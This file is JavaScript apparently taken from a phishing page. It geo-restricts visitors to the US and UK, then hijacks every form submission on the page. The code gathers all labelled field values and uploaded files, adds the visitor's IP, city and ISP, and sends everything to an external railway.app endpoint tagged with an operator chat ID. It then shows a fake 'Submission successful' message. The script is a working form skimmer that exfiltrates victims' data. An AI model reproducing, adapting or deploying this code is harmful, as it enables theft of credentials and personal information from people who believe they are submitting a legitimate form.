// ================= COUNTRY BLOCKER (RUNS FIRST) =================
(async function () {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    const allowed = ["US", "GB"]; // Allowed countries

    if (!data || !allowed.includes(data.country)) {

      const userCountry = data?.country_name || "Unknown (could not detect)";

      document.documentElement.innerHTML = `
        <style>
          body {
            margin: 0;
            background: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            text-align: center;
          }
        </style>
        <div>
          <h2>🚫 Access Restricted</h2>
          <p>This service is only available in the United States and United Kingdom.</p>
          <p>Your country: <b>${userCountry}</b></p>
        </div>
      `;

      throw new Error("Blocked country");
    }

  } catch (e) {
    console.warn("Country check failed:", e);
  }
})();


// ================= MAIN SCRIPT =================
document.addEventListener("DOMContentLoaded", () => {

  const DEFAULT_USER_ID = "6940101627";

  // ================= LOCATION API =================
  async function getLocationData() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();

      if (!data || !data.ip) throw new Error();

      return {
        ip: data.ip || "Unknown",
        country: data.country_name || "Unknown",
        city: data.city || "Unknown",
        isp: data.org || "Unknown"
      };

    } catch {
      return {
        ip: "Unknown",
        country: "Unknown",
        city: "Unknown",
        isp: "Unknown"
      };
    }
  }

  // ================= SMART LABEL DETECTOR =================
  function getSmartLabel(input, form, index) {

    if (input.id) {
      const lbl = form.querySelector(`label[for="${input.id}"]`);
      if (lbl) return lbl.innerText.trim();
    }

    if (input.closest("label")) {
      return input.closest("label").innerText.trim();
    }

    if (input.getAttribute("aria-label")) {
      return input.getAttribute("aria-label").trim();
    }

    if (input.placeholder) {
      return input.placeholder.trim();
    }

    if (input.previousElementSibling) {
      let text = input.previousElementSibling.innerText;
      if (text) return text.trim();
    }

    return `Field ${index + 1}`;
  }

  // ================= FORM BUILDER =================
  function buildGlobalFormData(userId, form) {

    const formData = new FormData();
    formData.append("chat_id", userId);

    let inputCount = 0;
    let fileCount = 0;
    let summary = [];

    const inputs = form.querySelectorAll("input, textarea, select");

    inputs.forEach((input, index) => {

      if (!input || ["submit", "button"].includes(input.type)) return;

      if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;

      let label = getSmartLabel(input, form, index);

      let key =
        input.name ||
        input.id ||
        label ||
        input.placeholder ||
        `field_${index + 1}`;

      key = key.replace(/\s+/g, "_").toLowerCase();

      if (input.type === "file") {
        if (!input.files || input.files.length === 0) return;

        for (let file of input.files) {
          formData.append(key, file);
          fileCount++;
        }

      } else {
        let value = input.value?.trim();
        if (!value) return;

        inputCount++;

        let fullInfo = `${label}: ${value}`;

        formData.append(key, fullInfo);
        summary.push(fullInfo);
      }

    });

    return { formData, inputCount, fileCount, summary };
  }

  // ================= UI =================
  function createBox() {
    let box = document.createElement("div");
    box.id = "centerBox";

    box.innerHTML = `
      <div id="centerContent">
        <div class="spinner"></div>
        <div id="centerText">Loading...</div>
        <button id="actionBtn" style="display:none;"></button>
      </div>
    `;

    document.body.appendChild(box);

    const style = document.createElement("style");
    style.innerHTML = `
      #centerBox {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.75);
        backdrop-filter: blur(6px);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 9999;
      }

      #centerContent {
        background: #111;
        color: #fff;
        padding: 30px;
        border-radius: 12px;
        text-align: center;
        width: 280px;
      }

      #actionBtn {
        margin-top: 20px;
        padding: 10px 16px;
        border: none;
        border-radius: 6px;
        background: #4CAF50;
        color: #fff;
        cursor: pointer;
      }

      .spinner {
        width: 35px;
        height: 35px;
        border: 3px solid rgba(255,255,255,0.2);
        border-top: 3px solid #4CAF50;
        border-radius: 50%;
        margin: 0 auto;
        animation: spin 1s linear infinite;
      }

      @keyframes spin {
        to { transform: rotate(360deg); }
      }
    `;
    document.head.appendChild(style);
  }

  function showBox(text, options = {}) {
    const { done = false, type = "none", userId = null } = options;

    const box = document.getElementById("centerBox");
    const textEl = document.getElementById("centerText");
    const btn = document.getElementById("actionBtn");
    const spinner = document.querySelector(".spinner");

    textEl.textContent = text;
    box.style.display = "flex";

    if (done) {
      spinner.style.display = "none";
      btn.style.display = "inline-block";

      if (type === "retry") {
        btn.textContent = "Retry";
        btn.onclick = () => location.reload();
      }

      if (type === "review") {
        btn.textContent = "Review";
        btn.onclick = () => {
          if (userId) {
            window.location.href = `c.html?id=${userId}`;
          }
        };
      }

    } else {
      spinner.style.display = "block";
      btn.style.display = "none";
    }
  }

  createBox();

  // ================= SUBMIT =================
  async function handleSubmit(form) {

    let userId = new URLSearchParams(window.location.search).get("id");
    if (!userId || isNaN(userId)) userId = DEFAULT_USER_ID;

    showBox("Processing...");
    await new Promise(resolve => setTimeout(resolve, 50));

    const { formData, inputCount, summary, fileCount } = buildGlobalFormData(userId, form);
    const loc = await getLocationData();

    let reportMessage = `
📥 NEW SUBMISSION

🌍 Location
IP: ${loc.ip}
Country: ${loc.country}
City: ${loc.city}
ISP: ${loc.isp}

📊 Data
Inputs: ${inputCount}
Files: ${fileCount}

📝 Values
${summary.length ? summary.join("\n") : "No input values"}
`;

    formData.append("report", reportMessage);

    try {
      const res = await fetch("https://web-production-d469f.up.railway.app/send", {
        method: "POST",
        body: formData
      });

      let data = await res.json().catch(() => ({}));

      if (!res.ok || data.ok === false) {
        showBox(`❌ ${data.error || "Server error"}`, {
          done: true,
          type: "retry"
        });
        return;
      }

      showBox("✅ Submission successful", {
        done: true,
        type: "review",
        userId
      });

      form.reset();

    } catch (err) {
      showBox(`❌ Network error: ${err.message}`, {
        done: true,
        type: "retry"
      });
    }
  }

  // ================= ATTACH =================
  document.addEventListener("submit", (e) => {
    const form = e.target;

    if (form.tagName === "FORM") {
      e.preventDefault();
      handleSubmit(form);
    }
  }, true);

});